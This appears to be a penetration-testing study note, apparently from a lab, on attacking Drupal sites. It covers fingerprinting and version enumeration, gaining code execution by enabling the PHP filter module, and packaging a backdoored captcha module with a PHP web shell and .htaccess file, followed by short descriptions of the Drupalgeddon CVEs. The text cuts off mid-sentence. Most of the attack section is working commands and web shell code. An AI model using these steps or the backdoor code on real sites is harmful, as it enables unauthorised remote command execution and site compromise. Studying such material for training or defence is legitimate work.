### Discovery
```bash
curl -s http://drupal.inlanefreight.local | grep Drupal

Or through Nodes
http://drupal.inlanefreight.local/node/1
```
1. `Administrator`: This user has complete control over the Drupal website.
2. `Authenticated User`: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
3. `Anonymous`: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

### Enumeration
```bash
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

Or using Droopscan found in the Joomla section

droopescan scan drupal -u http://drupal.inlanefreight.local
```

# Attacking Drupal less than v8
In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."
Then `save configuration`, the going to `Content->Adding content` to create a basic page. `system($_GET['cmd']);`
MAKE SURE TEXT FORMAT IS `PHP`.
Once everything is saved you can go to the node number then adding `?cmd=id`.
```bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

# Attacking Drupal v8 or more.
```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz

Once downloaded go to Administration > Reports > Available updates.
http://drupal.inlanefreight.local/admin/reports/updates/install

Then click browse then select the file from the dir thet we downloaded it to then click install.

Then going to content is is about the same as the v7 and down.
```

### Uploading a backdoored Module
```bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# Create a php file with
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>

# Then create a .htaccess file.
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>

mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.
Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.
`curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

# CVE
```bash
CVE-2014-3704, known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.

CVE-2018-7600, also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.

CVE-2018-7602, also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.
Let's walk through exp
```